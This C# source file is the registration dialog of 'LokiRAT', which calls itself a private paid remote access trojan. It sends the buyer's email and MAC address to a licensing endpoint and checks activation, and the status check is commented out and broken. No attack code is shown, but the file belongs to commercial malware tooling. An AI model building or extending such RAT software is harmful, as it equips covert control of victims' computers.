namespace LokiRAT_Client
{
    using LokiRAT_Server;
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Management;
    using System.Net;
    using System.Windows.Forms;

    public class register : Form
    {
        private Button button1;
        private IContainer components = null;
        private Label label1;
        private Label label2;
        private Label label3;
        private Label label4;
        private Panel panel1;
        private PictureBox pictureBox1;
        private TextBox textBox1;
        private System.Windows.Forms.Timer timer2;
        private WebClient wregister = new WebClient();

        public register()
        {
            this.InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                this.wregister.DownloadString("http://simitag.com/reg/new.php?mail=" + this.textBox1.Text + "&id=" + this.getID());
                MessageBox.Show("EMail request sent successfully!", "EMail Request | LokiRAT", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            catch
            {
                MessageBox.Show("EMail can't to send!", "Error | LokiRAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private string getID()
        {
            string str = null;
            ManagementObjectCollection objects = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapter").Get();
            foreach (ManagementObject obj2 in objects)
            {
                if (obj2["MACAddress"] != null)
                {
                    str = obj2["MACAddress"].ToString().Replace(":", "");
                }
            }
            return str;
        }

        private void InitializeComponent()
        {
            this.components = new Container();
            ComponentResourceManager manager = new ComponentResourceManager(typeof(register));
            this.button1 = new Button();
            this.textBox1 = new TextBox();
            this.label1 = new Label();
            this.label2 = new Label();
            this.label3 = new Label();
            this.panel1 = new Panel();
            this.pictureBox1 = new PictureBox();
            this.label4 = new Label();
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.panel1.SuspendLayout();
            ((ISupportInitialize) this.pictureBox1).BeginInit();
            base.SuspendLayout();
            this.button1.Location = new Point(0x8d, 0x6f);
            this.button1.Name = "button1";
            this.button1.Size = new Size(0x67, 0x17);
            this.button1.TabIndex = 0;
            this.button1.Text = "Send Request";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new EventHandler(this.button1_Click);
            this.textBox1.Location = new Point(15, 0x55);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new Size(0xe5, 20);
            this.textBox1.TabIndex = 1;
            this.label1.AutoSize = true;
            this.label1.Location = new Point(12, 9);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0xe8, 0x1a);
            this.label1.TabIndex = 2;
            this.label1.Text = "LokiRAT is private RAT. You must pay to use it.\r\nPlease contact us for payment method.";
            this.label2.AutoSize = true;
            this.label2.ForeColor = SystemColors.HotTrack;
            this.label2.Location = new Point(0x8a, 0xbd);
            this.label2.Name = "label2";
            this.label2.Size = new Size(0x6a, 13);
            this.label2.TabIndex = 3;
            this.label2.Text = "wulmbos@gmail.com";
            this.label3.AutoSize = true;
            this.label3.Location = new Point(12, 0x45);
            this.label3.Name = "label3";
            this.label3.Size = new Size(0x84, 13);
            this.label3.TabIndex = 4;
            this.label3.Text = "Request RAT, enter email:";
            this.panel1.Controls.Add(this.pictureBox1);
            this.panel1.Controls.Add(this.label4);
            this.panel1.Location = new Point(5, 7);
            this.panel1.Name = "panel1";
            this.panel1.Size = new Size(0xf2, 0xc5);
            this.panel1.TabIndex = 5;
            this.pictureBox1.Image = (Image) manager.GetObject("pictureBox1.Image");
            this.pictureBox1.Location = new Point(0x43, 0x3f);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new Size(0x75, 0x60);
            this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 1;
            this.pictureBox1.TabStop = false;
            this.label4.AutoSize = true;
            this.label4.Font = new Font("Microsoft Sans Serif", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label4.ForeColor = SystemColors.HotTrack;
            this.label4.Location = new Point(0x30, 0x1d);
            this.label4.Name = "label4";
            this.label4.Size = new Size(0xa5, 0x12);
            this.label4.TabIndex = 0;
            this.label4.Text = "Checking Registration...";
            this.timer2.Enabled = true;
            this.timer2.Tick += new EventHandler(this.timer2_Tick);
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0xfd, 210);
            base.Controls.Add(this.panel1);
            base.Controls.Add(this.label3);
            base.Controls.Add(this.label2);
            base.Controls.Add(this.label1);
            base.Controls.Add(this.textBox1);
            base.Controls.Add(this.button1);
            base.FormBorderStyle = FormBorderStyle.FixedDialog;
            base.Name = "register";
            this.Text = "Register | LokiRAT";
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            ((ISupportInitialize) this.pictureBox1).EndInit();
            base.ResumeLayout(false);
            base.PerformLayout();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            this.timer2.Stop();
            try
            {
                //main.enadis = this.wregister.DownloadString("http://simitag.com/reg/reg.php?id" = +this.getID());
            }
            catch
            {
                main.enadis = "0";
            }
            if (main.enadis == "1")
            {
                base.Close();
            }

        }
    }
}

